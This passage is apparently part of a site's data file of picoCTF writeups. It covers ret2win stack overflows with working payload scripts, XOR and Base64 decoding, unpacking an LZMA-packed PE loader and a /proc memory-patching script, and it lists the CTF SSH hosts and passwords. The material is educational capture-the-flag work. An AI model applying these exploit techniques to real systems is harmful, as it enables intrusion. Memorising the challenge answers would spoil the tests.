Distance from \`ebp-0x4c\` to saved return address at \`ebp+4\`:

\`\`\`text
0x4c + 0x4 = 0x50 = 80 bytes
\`\`\`

So the correct overwrite offset is:

\`\`\`text
80
\`\`\`

## Exploit

Payload structure:

\`\`\`text
"A" * 80 + p32(0x080491f6)
\`\`\`

One-liner used on the remote host:

\`\`\`bash
python3 - <<'PY' | ./11
import sys, struct
payload = b'A'*80 + struct.pack('<I', 0x080491f6)
sys.stdout.buffer.write(payload)
PY
\`\`\`

## Result

The binary returned into \`win()\` and printed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Takeaway

The only real pitfall was trusting the C source buffer size too literally. The generated 32-bit function saved \`ebx\`, which shifted the real return-address offset from \`72\` to \`80\`. Once the compiled stack frame was checked, the exploit was a direct ret2win.
`},{id:`08-offset-cyclev2-writeup`,title:`offset-cycleV2 Writeup`,excerpt:`picoCTF Offset Cycle V2 writeup building on the first version with additional protections requiring more advanced exploitation techniques.`,category:`picoCTF - Binary Exploitation`,content:`# offset-cycleV2 Writeup

## Challenge

SSH target:

\`\`\`bash
ssh -p 51554 ctf-player@dolphin-cove.picoctf.net
\`\`\`

Password:

\`\`\`text
83dcefb7
\`\`\`

## Goal

Run the generator, exploit the per-instance binary before the timeout, and recover the flag.

## Instance Flow

After login, \`instructions.txt\` explained:

1. Run \`./start\`
2. It copies a generated source file and binary into the current directory
3. You have 80 seconds to exploit it

Running \`./start\` produced:

- \`28.c\`
- \`28\`

## Generated Source

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 609
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\\n')
        i++;

    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count);

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());

    load_canary();
    vuln();
    return 0;
}
\`\`\`

## Vulnerability

The bug is the unchecked \`read(0, buf, count)\`.

\`count\` is attacker-controlled, so the program allows a classic stack overflow. The only barrier is the custom 4-byte canary copied from the first 4 bytes of \`CodeBank/flag.txt\`.

The key weakness is that picoCTF flags begin with \`pico\`, so the canary is predictable.

## Binary Properties

\`\`\`text
Arch: i386
RELRO: Partial RELRO
Canary: No compiler canary
NX: Enabled
PIE: No
Stripped: No
\`\`\`

## Important Addresses

From \`nm -n 28\`:

\`\`\`text
08049316 T win
08049411 T vuln
0804952c T main
\`\`\`

Target:

\`\`\`text
win = 0x08049316
\`\`\`

## Real Stack Layout

The compiled \`vuln\` function placed:

- \`buf\` at \`ebp-0x271\`
- \`local_canary\` at \`ebp-0x10\`
- saved return address at \`ebp+4\`

From the disassembly:

\`\`\`asm
lea eax,[ebp-0x271]   ; buf
lea eax,[ebp-0x10]    ; local_canary
\`\`\`

So:

- offset from \`buf\` to \`local_canary\` = \`0x271 - 0x10 = 0x261 = 609\`
- offset from \`buf\` to saved return address = \`0x271 + 4 = 0x275 = 629\`

That means the payload must be:

1. \`609\` bytes padding
2. correct 4-byte canary: \`pico\`
3. \`16\` bytes filler
4. \`win()\` address

## Exploit

Working remote payload:

\`\`\`bash
python3 - <<'PY' | ./28
import sys, struct
count = 609 + 4 + 16 + 4
payload = b'A'*609 + b'pico' + b'B'*16 + struct.pack('<I', 0x08049316)
sys.stdout.write(str(count) + '\\n')
sys.stdout.flush()
sys.stdout.buffer.write(payload)
PY
\`\`\`

## Result

The exploit printed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Takeaway

This was a ret2win with a fake manual canary. The only trick was recognizing that the canary came from the first four bytes of the flag file, which are predictably \`pico\` on picoCTF instances. Once that was supplied in the overflow, control flow could be redirected directly into \`win()\`.
`},{id:`01-hidden-cipher-1-writeup`,title:`Hidden Cipher 1 Writeup`,excerpt:`picoCTF Hidden Cipher 1 writeup reversing an encryption algorithm to decode the hidden flag from ciphertext output.`,category:`picoCTF - Reverse Engineering`,content:`# Hidden Cipher 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`hiddencipher.zip\`, extracted \`hiddencipher\`
- Tools:
- \`unzip\`
- \`file\`
- \`checksec\`
- \`upx\`
- \`nm\`
- \`objdump\`
- \`nc\`
- \`python3\`

## 1) Extract and inspect

\`\`\`bash
unzip -l hiddencipher.zip
unzip -o hiddencipher.zip -d /tmp/hiddencipher_work
file /tmp/hiddencipher_work/hiddencipher
checksec --file=/tmp/hiddencipher_work/hiddencipher
\`\`\`

Binary was UPX-packed.

## 2) Unpack and reverse

\`\`\`bash
upx -d /tmp/hiddencipher_work/hiddencipher -o /tmp/hiddencipher_work/hiddencipher.unpacked
nm -n /tmp/hiddencipher_work/hiddencipher.unpacked
objdump -d -Mintel --start-address=0x12a9 --stop-address=0x148c /tmp/hiddencipher_work/hiddencipher.unpacked
\`\`\`

Recovered behavior:
- key built in \`get_secret\`: \`S3Cr3t\`
- output is hex of \`flag[i] XOR key[i % 6]\`

## 3) Get remote ciphertext

\`\`\`bash
nc candy-mountain.picoctf.net 61607
\`\`\`

Captured ciphertext hex:
- \`235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01156a57224306172e\`

## 4) Decrypt

\`\`\`bash
python3 - << 'PY'
ct = bytes.fromhex('235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01156a57224306172e')
key = b'S3Cr3t'
pt = bytes([b ^ key[i % len(key)] for i, b in enumerate(ct)])
print(pt.decode())
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`02-hidden-cipher-2-writeup`,title:`Hidden Cipher 2 Writeup`,excerpt:`picoCTF Hidden Cipher 2 writeup tackling a more complex cipher implementation requiring deeper static analysis to reverse the encoding.`,category:`picoCTF - Reverse Engineering`,content:`# Hidden Cipher 2 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Tools:
- \`nc\`
- \`python3\`

## 1) Connect and pass gate prompt

\`\`\`bash
nc crystal-peak.picoctf.net 62957
\`\`\`

Prompt asked:
- \`What is 8 - 1?\`
- answer: \`7\`

## 2) Observe encoding rule

Service prints integer list like:
- \`784, 735, 693, ...\`

Check first value:
- \`784 / 7 = 112\` -> ASCII \`p\`

So encoding is:
- \`encoded = ascii * 7\`

## 3) Decode all numbers

\`\`\`bash
python3 - << 'PY'
vals=[784,735,693,777,469,588,490,861,763,364,812,728,665,686,357,728,343,770,700,665,693,343,784,728,357,798,665,357,343,392,371,707,700,350,707,875]
print(''.join(chr(v//7) for v in vals))
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`03-bypass-me-writeup`,title:`Bypass Me Writeup`,excerpt:`picoCTF Bypass Me writeup patching or reversing binary validation logic to bypass authentication checks and reveal the flag.`,category:`picoCTF - Reverse Engineering`,content:`# Bypass Me Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Remote file: \`bypassme.bin\`
- Tools:
- \`ssh\`
- \`scp\`
- \`file\`
- \`checksec\`
- \`nm\`
- \`strings\`
- \`objdump\`
- \`python3\`

## 1) Connect and fetch binary

\`\`\`bash
ssh -p 50568 ctf-player@foggy-cliff.picoctf.net
# password: f3b61b38
scp -P 50568 ctf-player@foggy-cliff.picoctf.net:/home/ctf-player/bypassme.bin /tmp/bypassme.bin
\`\`\`

## 2) Inspect symbols and strings

\`\`\`bash
file /tmp/bypassme.bin
checksec --file=/tmp/bypassme.bin
nm -n /tmp/bypassme.bin
strings -n 3 /tmp/bypassme.bin | rg "Raw Input|Sanitized|flag|Denied"
\`\`\`

Key functions:
- \`_Z15decode_passwordPc\`
- \`_Z8sanitizePKcPc\`
- \`_Z13auth_sequencev\`
- \`main\`

## 3) Reverse decode routine

\`\`\`bash
objdump -d -Mintel --start-address=0x1333 --stop-address=0x1457 /tmp/bypassme.bin
\`\`\`

Decoded bytes are XORed with \`0xAA\` from constants:
- \`f9 df da cf d8 f9 cf c9 df d8 cf\`

Decode:

\`\`\`bash
python3 - << 'PY'
enc = bytes.fromhex('f9dfdacfd8f9cfc9dfd8cf')
print(bytes([b ^ 0xaa for b in enc]).decode())
PY
\`\`\`

Password recovered:
- \`SuperSecure\`

## 4) Verify comparison target in \`main\`

\`\`\`bash
objdump -d -Mintel --start-address=0x162e --stop-address=0x1840 /tmp/bypassme.bin
\`\`\`

Important behavior:
- sanitizer output is shown
- auth compare uses raw input against decoded password

## 5) Authenticate remotely

\`\`\`bash
ssh -p 50568 ctf-player@foggy-cliff.picoctf.net
./bypassme.bin
# Enter: SuperSecure
\`\`\`

## Final password

\`SuperSecure\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`04-add-on-trap-writeup`,title:`Add/On Trap Writeup`,excerpt:`picoCTF Add On Trap writeup analyzing a binary with anti-debugging traps and reversing the validation to extract the correct flag.`,category:`picoCTF - Reverse Engineering`,content:`# Add/On Trap Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- File: \`suspicious.zip\` (password: \`picoctf\`)
- Extracted artifact: \`.xpi\` extension
- Tools:
- \`unzip\`
- \`sed\`
- \`rg\`
- \`python3\`
- \`cryptography.fernet\`

## 1) Extract archive and extension

\`\`\`bash
unzip -P picoctf -l suspicious.zip
unzip -P picoctf -o suspicious.zip -d /tmp/suspicious_work
unzip -o /tmp/suspicious_work/56102ec0438646c68605-1.0.xpi -d /tmp/suspicious_work/xpi
\`\`\`

## 2) Read extension JS

\`\`\`bash
sed -n '1,260p' /tmp/suspicious_work/xpi/background/main.js
sed -n '1,260p' /tmp/suspicious_work/xpi/assets/script.js
\`\`\`

Found:
- Fernet key string
- Fernet ciphertext token

## 3) Decrypt token with key

\`\`\`bash
python3 - << 'PY'
from cryptography.fernet import Fernet
key=b'cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0='
tok=b'gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
print(Fernet(key).decrypt(tok).decode())
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`05-silent-stream-writeup`,title:`Silent Stream Writeup`,excerpt:`picoCTF Silent Stream writeup recovering hidden data from a binary that outputs the flag through non-obvious channels or side effects.`,category:`picoCTF - Reverse Engineering`,content:`# Silent Stream Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`packets.pcap\`, \`encrypt.py\`
- Tools:
- \`file\`
- \`sed\`
- \`tshark\`
- \`python3\`

## 1) Inspect provided files

\`\`\`bash
file packets.pcap encrypt.py
sed -n '1,260p' encrypt.py
\`\`\`

\`encrypt.py\` shows byte encoding:
- \`encode_byte(b, key) = (b + key) % 256\`
- key used: \`42\`

## 2) Extract TCP payload bytes

\`\`\`bash
tshark -r packets.pcap -T fields -e tcp.payload
\`\`\`

Concatenate non-empty payload lines as hex.

## 3) Reverse transform and rebuild file

\`\`\`bash
python3 - << 'PY'
import subprocess
out = subprocess.check_output(['tshark','-r','packets.pcap','-T','fields','-e','tcp.payload'], text=True)
hexstr = ''.join(line.strip() for line in out.splitlines() if line.strip())
enc = bytes.fromhex(hexstr)
dec = bytes((b - 42) % 256 for b in enc)
open('/tmp/silent_stream_decoded.jpg','wb').write(dec)
print('decoded bytes:', len(dec))
PY
\`\`\`

## 4) Verify output type

\`\`\`bash
file /tmp/silent_stream_decoded.jpg
\`\`\`

Then open image and read flag text.

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`06-autorev-1-writeup`,title:`Autorev 1 Writeup`,excerpt:`picoCTF AutoRev 1 writeup using automated reverse engineering tools like angr or Z3 to solve constraint-based flag validation.`,category:`picoCTF - Reverse Engineering`,content:`# Autorev 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Remote service only
- Tools:
- \`nc\`
- \`python3\`
- \`pwntools\`

## Challenge behavior

Service sends 20 rounds.
Each round includes:
- a leaked integer line
- a hex-encoded ELF blob
- prompt: \`What's the secret?:\`

## Key observation

The leaked integer printed before each blob is already the required answer for that round.
So fastest solve is to parse and send it directly.

## Working solver

\`\`\`python
from pwn import remote
import re

io = remote('mysterious-sea.picoctf.net', 61817)

chunk = io.recvuntil(b"Here's the next binary in bytes:\\n")
nums = re.findall(rb'\\n(\\d+)\\n', b'\\n' + chunk)
cur = nums[-1]

for r in range(1, 21):
    _ = io.recvline().strip()
    io.recvuntil(b"What's the secret?:")
    io.sendline(cur)

    if r == 20:
        break

    chunk = io.recvuntil(b"Here's the next binary in bytes:\\n")
    nums = re.findall(rb'\\n(\\d+)\\n', b'\\n' + chunk)
    cur = nums[-1]

print(io.recvrepeat(2).decode('latin-1','replace'))
io.close()
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`07-secure-password-database-writeup`,title:`Secure Password Database Writeup`,excerpt:`picoCTF Secure Password Database writeup reversing a password database application to extract stored credentials and recover the flag.`,category:`picoCTF - Reverse Engineering`,content:`# Secure Password Database Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- File: \`system.out\`
- Tools:
- \`file\`
- \`checksec\`
- \`strings\`
- \`nm\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect binary and symbols

\`\`\`bash
file system.out
checksec --file=system.out
strings -n 3 system.out
nm -n system.out
\`\`\`

Interesting functions:
- \`hash\`
- \`make_secret\`
- \`main\`

## 2) Reverse auth logic

\`\`\`bash
objdump -d -Mintel --start-address=0x1309 --stop-address=0x13d0 system.out
objdump -d -Mintel --start-address=0x13d0 --stop-address=0x1754 system.out
objdump -s --start-address=0x2000 --stop-address=0x2200 system.out
\`\`\`

Observed bug:
- program asks your password and hash
- but compares input hash against hash of internal decoded secret, not your password

## 3) Recover internal secret

\`make_secret\` XOR-decodes obfuscated bytes with \`0xAA\`.

Obfuscated bytes:
- \`c3 ff c8 c2 92 9b 8b c0 80 c2 c4 8b\`

Decode:

\`\`\`bash
python3 - << 'PY'
obf = bytes.fromhex('c3ffc8c2929b8bc080c2c48b')
print(bytes([b ^ 0xAA for b in obf]).decode())
PY
\`\`\`

Recovered secret:
- \`iUbh81!j*hn!\`

## 4) Reproduce hash function

From reverse:
- seed = \`0x1505\`
- loop = \`h = h*33 + byte\` (64-bit wrap)

\`\`\`bash
python3 - << 'PY'
h = 0x1505
for b in b'iUbh81!j*hn!':
    h = (h*33 + b) & 0xffffffffffffffff
print(h)
PY
\`\`\`

Computed hash:
- \`15237662580160011234\`

## 5) Authenticate remotely

\`\`\`bash
nc candy-mountain.picoctf.net 54587
\`\`\`

Use any password text, then provide hash:
- \`15237662580160011234\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`08-bin-ins3-writeup`,title:`Binary Instrumentation 3 (bin-ins3.zip) Writeup`,excerpt:`picoCTF Binary Instrumentation 3 writeup using dynamic binary instrumentation tools like Frida or Pin to trace and solve the challenge.`,category:`picoCTF - Reverse Engineering`,content:`# Binary Instrumentation 3 (bin-ins3.zip) Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

I only used local static-analysis tools:

- \`7z\`
- \`file\`
- \`rabin2\`
- \`objdump\`
- \`strings\`
- \`xxd\`
- \`od\`
- \`python3\` standard library (\`lzma\`, \`base64\`)

I did not need debugger patching to recover the final flag.

## 1) Unzip the challenge and inspect the executable

\`\`\`bash
7z x -p'picoctf' bin-ins3.zip
file bin-ins.exe
\`\`\`

Result:
- \`bin-ins.exe\` is a 64-bit Windows PE executable.

## 2) Look at the PE sections

\`\`\`bash
rabin2 -S bin-ins.exe
\`\`\`

Important output:
- normal sections like \`.text\`, \`.rdata\`, \`.data\`, \`.rsrc\`, \`.reloc\`
- one suspicious large custom section: \`.ATOM\`

\`.ATOM\` details:
- file offset (\`paddr\`) = \`0x6000\`
- file size = \`0x6fe00\`

Working theory:
- outer executable is a loader
- real payload is hidden in \`.ATOM\`

## 3) Extract the \`.ATOM\` section

\`\`\`bash
dd if=bin-ins.exe of=atom.bin bs=1 skip=$((0x6000)) count=$((0x6fe00)) status=none
\`\`\`

## 4) Check whether \`.ATOM\` is compressed

\`\`\`bash
od -Ax -tx1 -N 32 atom.bin
\`\`\`

Beginning bytes:
- \`5d 00 00 10 00 ...\`

This matches LZMA “alone” header structure:
- first byte = properties (\`0x5d\`)
- next 4 bytes = dictionary size

## 5) Decompress hidden payload with Python

\`\`\`python
import lzma

data = open("atom.bin", "rb").read()
dec = lzma.decompress(data, format=lzma.FORMAT_ALONE)
open("inner.bin", "wb").write(dec)
\`\`\`

Then verify:

\`\`\`bash
file inner.bin
\`\`\`

Result:
- \`inner.bin\` is another PE executable.

Confirmed structure:
- \`bin-ins.exe\` = outer wrapper
- \`.ATOM\` = compressed payload
- \`inner.bin\` = real challenge logic

## 6) Inspect the inner executable

Search for relevant strings:

\`\`\`bash
strings -n 5 inner.bin | grep -E "output_flag|cmd.exe /c echo|flagParts|cGljb0NURns0|MTFfNHIzXzRw|MTVfbjA3aDFu|OV8zbDUzXzRm|NzA2NDBlfQo="
\`\`\`

Recovered:
- \`C:\\random\\output_flag.txt\`
- \`cmd.exe /c echo testing if redirection works\`
- \`cmd.exe /c echo\`
- \`_ZL9flagParts\`
- encoded fragments:
- \`cGljb0NURns0\`
- \`MTFfNHIzXzRw\`
- \`MTVfbjA3aDFu\`
- \`OV8zbDUzXzRm\`
- \`NzA2NDBlfQo=\`

From static code/strings, logic is:
- program attempts to create/open output file
- runs command with redirected output
- uses a broken handle comparison (the “messed up” part)
- intended flag text is assembled from \`flagParts\` fragments

## 7) Decode the Base64 fragments

\`\`\`python
import base64

parts = [
    b'cGljb0NURns0',
    b'MTFfNHIzXzRw',
    b'MTVfbjA3aDFu',
    b'OV8zbDUzXzRm',
    b'NzA2NDBlfQo='
]

flag = b''.join(base64.b64decode(p) for p in parts)
print(flag)
\`\`\`

Output:
- \`b'picoCTF{<redacted>}\\n'\`

Removing the trailing newline:
- \`picoCTF{<redacted>}\`

## 8) Final flag

\`picoCTF{<redacted>}\`
`},{id:`09-binary-instrumentation-4-writeup`,title:`Binary Instrumentation 4 (bin-ins4.zip) Writeup`,excerpt:`picoCTF Binary Instrumentation 4 writeup applying advanced instrumentation techniques to hook functions and extract the flag at runtime.`,category:`picoCTF - Reverse Engineering`,content:`# Binary Instrumentation 4 (bin-ins4.zip) Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`bin-ins4.zip\`, extracted \`bin-ins.exe\`
- Tools:
- \`7z\`
- \`file\`
- \`rabin2\`
- \`objdump\`
- \`strings\`
- \`dd\`
- \`python3\` (\`lzma\`, \`base64\`)

## 1) Unzip and inspect the outer binary

\`\`\`bash
7z x -p'picoctf' bin-ins4.zip
file bin-ins.exe
\`\`\`

Result:
- \`bin-ins.exe\` is a 64-bit Windows PE.

## 2) Inspect PE sections

\`\`\`bash
rabin2 -S bin-ins.exe
\`\`\`

Important finding:
- custom section \`.ATOM\`
- file offset (\`paddr\`) = \`0x6000\`
- size = \`0x6fe00\`

This strongly suggests an embedded packed payload.

## 3) Extract \`.ATOM\`

\`\`\`bash
dd if=bin-ins.exe of=atom.bin bs=1 skip=$((0x6000)) count=$((0x6fe00)) status=none
\`\`\`

## 4) Identify compression format

\`\`\`bash
xxd -l 16 atom.bin
\`\`\`

Header starts with:
- \`5d 00 00 10 00 ...\`

That is the LZMA-alone header pattern.

## 5) Decompress \`.ATOM\` into inner executable

\`\`\`bash
python3 - << 'PY'
import lzma, pathlib
atom = pathlib.Path('atom.bin').read_bytes()
inner = lzma.decompress(atom, format=lzma.FORMAT_ALONE)
pathlib.Path('inner.exe').write_bytes(inner)
print('inner size:', len(inner))
PY

file inner.exe
\`\`\`

Result:
- \`inner.exe\` is another PE executable (real challenge logic).

## 6) Extract behavior clues from inner executable

\`\`\`bash
strings -n 5 inner.exe | rg -n "192\\.168\\.29\\.25|9867|Enter the key|key9e60dee4|Congratulations|flagParts|lstrcmpA|cGljb0NURnt|uM3R3MHJrXz|FzXzRQMXNfN|FNfVzMxMV85|ZTYwZGVlNH0K" -i
\`\`\`

Recovered strings include:
- \`192.168.29.25\`
- \`Enter the key:\`
- \`key9e60dee4\`
- \`Congratulations! Here's your flag:\`
- Base64 fragments:
- \`cGljb0NURnt\`
- \`uM3R3MHJrXz\`
- \`FzXzRQMXNfN\`
- \`FNfVzMxMV85\`
- \`ZTYwZGVlNH0K\`

## 7) Confirm compare logic in disassembly

\`\`\`bash
objdump -d -Mintel --start-address=0x401560 --stop-address=0x401a80 inner.exe
\`\`\`

Main flow:
- creates socket (\`WSAStartup\`, \`socket\`, \`connect\`)
- connects to \`192.168.29.25:9867\`
- sends text prompt
- receives response
- compares response with hardcoded key via \`lstrcmpA\`
- success path concatenates \`flagParts\` and sends success message + decoded flag content

## 8) Rebuild and decode the flag

Concatenate fragments first:

\`\`\`text
cGljb0NURntuM3R3MHJrXzFzXzRQMXNfNFNfVzMxMV85ZTYwZGVlNH0K
\`\`\`

Decode:

\`\`\`bash
python3 - << 'PY'
import base64
s = 'cGljb0NURntuM3R3MHJrXzFzXzRQMXNfNFNfVzMxMV85ZTYwZGVlNH0K'
print(base64.b64decode(s).decode())
PY
\`\`\`

Output:
- \`picoCTF{<redacted>}\`

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`10-jitfp-writeup`,title:`JITFP Writeup`,excerpt:`picoCTF JITFP writeup reversing a just-in-time compiled program, analyzing dynamically generated code to understand flag computation.`,category:`picoCTF - Reverse Engineering`,content:`# JITFP Writeup

Here is the exact writeup of how I solved it, step by step, including the tools and commands used.

## Files and tools used

- Remote binary on host: \`ad7e550b\`
- Tools:
- \`ssh\`
- \`file\`
- \`checksec\`
- \`objdump\`
- \`readelf\`
- \`strings\`
- \`python3\` (for runtime memory extraction via \`/proc/<pid>/mem\`)

## 1) Connect to the remote host

\`\`\`bash
ssh -p 62688 ctf-player@dolphin-cove.picoctf.net
\`\`\`

Password used:

\`\`\`text
1db87a14
\`\`\`

## 2) Identify the challenge binary

\`\`\`bash
ls -la
file ad7e550b
checksec --file=ad7e550b
\`\`\`

Key findings:
- 64-bit PIE ELF, stripped.
- Full RELRO, NX enabled.
- Program expects one argument (\`<flag>\`).

## 3) Confirm checker behavior and timing hint

\`\`\`bash
./ad7e550b
\`\`\`

Output shows usage:

\`\`\`text
Usage: ./ad7e550b <flag>
\`\`\`

Testing with dummy input shows:
- It prints progress markers (\`*\`) with delays.
- It can return partial progress then \`Incorrect\`.
- This matches the challenge hint: timing/progress leak.

## 4) Reverse the checker structure statically

I inspected disassembly and sections:

\`\`\`bash
objdump -d -Mintel ad7e550b | sed -n '700,1220p'
readelf -S ad7e550b
objdump -s -j .data ad7e550b
\`\`\`

Important observations:
- Main check loop validates 33 bytes (\`0x21\`).
- It sleeps between checks (\`sleep@plt\`) and prints \`*\` on success.
- It uses:
- a permutation table in \`.data\` at \`0x4020\` (33 dwords)
- a function-pointer table at \`0x4120\`
- each pointed function is a tiny \`cmp input_char, imm8\` checker.

This means each position checks for one exact character; the challenge hides the order via table indirection.

## 5) Extract the real checker table at runtime (host-only logic)

\`0x4120\` is populated in process memory, so I extracted it live from \`/proc/<pid>/mem\` while the binary runs.

Core idea:
- Start \`./ad7e550b\` with a 33-byte placeholder.
- Read function pointers from \`base + 0x4120\`.
- For each function pointer, read the compared byte immediate from function code.
- Apply permutation from \`0x4020\` to reconstruct the expected flag string.
- Patch argv memory in-place during execution to force all checks to pass.

One-shot script used on the remote host:

\`\`\`bash
python3 - <<'PY'
import os,pty,subprocess,time,select,sys,struct
perm=[0x1e,0x16,0x0b,0x20,0x19,0x04,0x09,0x07,0x13,0x17,0x05,0x1a,0x12,0x1b,0x10,0x01,0x08,0x0f,0x02,0x0e,0x03,0x0d,0x18,0x15,0x0c,0x11,0x06,0x0a,0x1d,0x1c,0x14,0x1f,0x00]
master, slave = pty.openpty()
arg = bytearray(b'A'*33)
p = subprocess.Popen(['./ad7e550b', arg.decode()], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
os.close(slave)
pid=p.pid
maps=open(f'/proc/{pid}/maps').read().splitlines()
base=None; stack_lo=stack_hi=None
for l in maps:
    if 'ad7e550b' in l and 'r-xp' in l:
        base=int(l.split('-')[0],16)-0x1000
    if '[stack]' in l:
        lo,hi=l.split()[0].split('-'); stack_lo=int(lo,16); stack_hi=int(hi,16)
mem=open(f'/proc/{pid}/mem','r+b',0)
mem.seek(stack_lo)
stack=mem.read(stack_hi-stack_lo)
off=stack.find(b'A'*33+b'\\x00')
arg_addr=stack_lo+off
while True:
    try:
        mem.seek(base+0x4120)
        tbl=mem.read(8*33)
        if len(tbl)==8*33:
            vals=struct.unpack('<33Q',tbl)
            chars=[ord('?')]*33
            for i,v in enumerate(vals):
                if v:
                    mem.seek(v+12)      # immediate byte in tiny checker
                    b=mem.read(1)
                    if b: chars[i]=b[0]
            for pos,idx in enumerate(perm):
                c=chars[idx]
                if 32 <= c <= 126:
                    arg[pos]=c
            mem.seek(arg_addr)
            mem.write(arg)
    except Exception:
        pass
    r,_,_=select.select([master],[],[],0.02)
    if r:
        try:
            data=os.read(master,4096).decode('latin-1','ignore')
            if data:
                sys.stdout.write(data)
                sys.stdout.flush()
        except OSError:
            pass
    if p.poll() is not None:
        break
print("\\nRecovered:", arg.decode('latin-1'))
PY
\`\`\`

Output included:
- full progress then \`Correct\`
- recovered candidate string:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## 6) Verify by running with recovered flag

\`\`\`bash
./ad7e550b 'picoCTF{<redacted>}'
\`\`\`

Expected result:

\`\`\`text
Correct
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`

## Optional: copy binary locally for offline notes

From local machine:

\`\`\`bash
scp -P 62688 ctf-player@dolphin-cove.picoctf.net:~/ad7e550b .
\`\`\`
`},{id:`11-gatekeeper-writeup`,title:`Gatekeeper Reverse Engineering Writeup`,excerpt:`picoCTF Gatekeeper writeup reversing a gatekeeper binary with multiple validation stages to find the correct input sequence for the flag.`,category:`picoCTF - Reverse Engineering`,content:`# Gatekeeper Reverse Engineering Writeup

## Challenge Summary

The binary \`gatekeeper\` asks for a numeric code and, on success, reveals the flag. The hint says the program output is not straightforward and suggests reversing the string and removing extra text.

The remote target provided for the live flag was:

\`nc green-hill.picoctf.net 57942\`

## Initial Recon

Basic inspection showed that the file is a 64-bit ELF and is not stripped, which makes reverse engineering easier.

Useful commands:

\`\`\`bash
file gatekeeper
strings -n 4 gatekeeper
objdump -d -Mintel gatekeeper
objdump -s -j .rodata gatekeeper
\`\`\`

Important strings recovered from the binary:

- \`/flag.txt\`
- \`Access granted: \`
- \`ftc_oc_ip\`
- \`Enter a numeric code (must be > 999 ): \`
- \`Too small.\`
- \`Too high.\`
- \`Access Denied.\`

Those strings already suggest the flow:

1. Read an input string.
2. Parse and validate it.
3. If accepted, read \`/flag.txt\`.
4. Print the flag in a mangled format.

## Main Logic

Disassembly of \`main\` shows the full gate condition.

The program:

1. Reads up to 31 characters using \`scanf("%31s", ...)\`.
2. Stores the input length with \`strlen\`.
3. Checks whether the whole string is decimal.
4. If not decimal, checks whether the whole string is hexadecimal.
5. Converts decimal with \`atoi\` or hex with \`strtol(..., 16)\`.
6. Rejects values \`<= 999\`.
7. Rejects values \`> 9999\`.
8. Requires the original input length to be exactly 3 characters.
9. Calls \`reveal_flag()\` only if all checks pass.

That means the accepted inputs are:

- exactly 3 characters long
- either all decimal digits or all hexadecimal characters
- numeric value between 1000 and 9999 inclusive

The simplest passing input is:

\`3e8\`

Why it works:

- it is 3 characters long
- it is valid hexadecimal
- \`0x3e8 == 1000\`
- \`1000 > 999\`
- \`1000 <= 9999\`

## Validation Functions

There are two helper functions:

- \`is_valid_decimal\`
- \`is_valid_hex\`

\`is_valid_decimal\` checks every character with the libc ctype table and requires each one to be a decimal digit.

\`is_valid_hex\` does the same but accepts any hexadecimal digit (\`0-9\`, \`a-f\`, \`A-F\`).

There is no prefix handling like \`0x\`; the string must be pure hex characters.

## Flag Output Routine

The \`reveal_flag\` function:

1. Opens \`/flag.txt\` in read mode.
2. Reads the entire file into memory.
3. Prints \`Access granted: \`.
4. Iterates backward through the file contents, printing one character at a time.
5. Every time the current reverse index is divisible by 4, it also prints the extra text \`ftc_oc_ip\`.

This means the displayed output is intentionally obfuscated:

- the flag is reversed
- junk text is inserted periodically

The hint matches this exactly: reverse the string and remove extra text.

## Remote Solve

Submitting the correct input:

\`\`\`bash
